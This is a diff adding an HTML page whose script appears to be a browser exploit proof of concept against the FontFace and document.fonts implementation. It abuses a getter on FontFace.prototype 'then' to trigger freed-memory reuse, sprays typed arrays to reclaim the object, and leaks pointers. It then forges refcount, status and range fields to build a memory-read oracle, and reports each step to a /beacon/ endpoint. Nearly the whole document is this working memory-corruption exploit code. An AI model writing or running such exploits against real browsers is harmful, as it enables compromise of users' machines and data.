@@ -1,0 +1,127 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p811</title></head>
+<body><pre id="out">p811: oracle with status=3</pre>
+<script>
+"use strict";
+var O=document.getElementById("out");
+var UID=Math.random().toString(36).slice(2,8);
+function b(m){try{O.textContent+='\n'+m;}catch(e){}
+  try{var u='/beacon/P811-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID;navigator.sendBeacon&&navigator.sendBeacon(u);}catch(e){}
+  try{new Image().src='/beacon/P811-'+encodeURIComponent(m)+'?t='+Date.now();}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P811-'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){b(m+'-XLOST');}}
+
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function hex(x){return '0x'+x.toString(16);}
+
+var SIZE=192,K=256,fired=false;
+
+function start(){
+  var vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(vf);void vf.loaded;
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+
+  document.fonts.load('1em vf, v1','AB').then(function(f){
+    b('RES-n'+f.length);
+    setTimeout(function(){
+      // Find hit
+      var bufs=[],L1=0n,L2=0n;
+      for(var i=0;i<window.__sp.length;i++){
+        var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+        if(a>0x1000000000n){bufs.push([window.__sp[i],c]);if(L1===0n){L1=a;L2=c;}}
+      }
+      b('L1-'+hex(L1));b('L2-'+hex(L2));b('HITS-'+bufs.length);
+      if(!bufs.length){b('NOLEAK');return;}
+
+      // Forge: refcount=2, copy L2 to +0x08, status=0
+      for(var ib=0;ib<bufs.length;ib++){
+        bufs[ib][0][0]=2;put64(bufs[ib][0],0x08,bufs[ib][1]);bufs[ib][0][0x10]=0;bufs[ib][0][0x82]=0;
+      }
+      // Also set status=0 on ALL spray buffers
+      for(var ia=0;ia<window.__sp.length;ia++)window.__sp[ia][0x82]=0;
+
+      // Rename faces
+      for(var i2=0;i2<f.length;i2++){try{f[i2].family='zz'+i2;}catch(e){}}
+      b('FAMILY-OK');
+
+      setTimeout(function(){
+        for(var i4=0;i4<f.length;i4++){try{document.fonts.add(f[i4]);}catch(e){}}
+        b('ADD-OK');
+
+        setTimeout(function(){
+          var fam=null,zi=-1;
+          for(var q=0;q<f.length;q++){
+            try{if(document.fonts.check('1em zz'+q,'A')===false){fam='zz'+q;zi=q;break;}}catch(e){}
+          }
+          b('FACE-'+fam+',zi='+zi);
+          if(zi<0){b('NOFACE');return;}
+
+          // Set ranges count/capacity
+          for(var is=0;is<bufs.length;is++){bufs[is][0][0x28]=1;bufs[is][0][0x2C]=1;}
+
+          function setR(t){for(var ir=0;ir<bufs.length;ir++){put64(bufs[ir][0],0x20,t);}}
+          function chk(c){try{return document.fonts.check('1em '+fam,String.fromCodePoint(c));}catch(e){return 'ERR';}}
+
+          // TEST WITH STATUS=0 (baseline)
+          setR(L2+0x07n);
+          bs('S0-chk0='+chk(0)+',chk41='+chk(0x41)+',chkFFFF='+chk(0xFFFF));
+
+          // NOW: SET STATUS=3 (Loaded) ON HIT BUFFERS
+          for(var ib2=0;ib2<bufs.length;ib2++) bufs[ib2][0][0x82]=3;
+          bs('STATUS-SET-3');
+
+          // TEST WITH STATUS=3
+          setR(L2+0x07n);
+          var c0=chk(0),c41=chk(0x41),cFF=chk(0xFF),c1000=chk(0x1000),cFFFF=chk(0xFFFF);
+          bs('S3-chk0='+c0+',chk41='+c41+',chkFF='+cFF+',chk1000='+c1000+',chkFFFF='+cFFFF);
+
+          // If any check returned false, the oracle is WORKING
+          if(c0===false||c41===false||c1000===false){
+            bs('ORACLE-ALIVE');
+
+            // Do a boundary scan
+            var lo=0,hi=0x10FFFF,res=-1;
+            while(lo<=hi){
+              var mid=(lo+hi)>>1;
+              var r=chk(mid);
+              if(r===null||r==='ERR')break;
+              if(r===false){res=mid;lo=mid+1;}else hi=mid-1;
+            }
+            bs('BOUNDARY-'+res.toString(16));
+          } else {
+            bs('ORACLE-STILL-DEAD');
+            // Try other status values
+            for(var sv=1;sv<=5;sv++){
+              for(var ib3=0;ib3<bufs.length;ib3++) bufs[ib3][0][0x82]=sv;
+              setR(L2+0x07n);
+              var cv=chk(0);
+              bs('S'+sv+'-chk0='+cv);
+            }
+          }
+
+          // Restore status=0
+          for(var ib4=0;ib4<bufs.length;ib4++) bufs[ib4][0][0x82]=0;
+          bs('DONE');
+        },60);
+      },60);
+    },80);
+  });
+}
+
+setTimeout(start,0);
+</script></body></html>
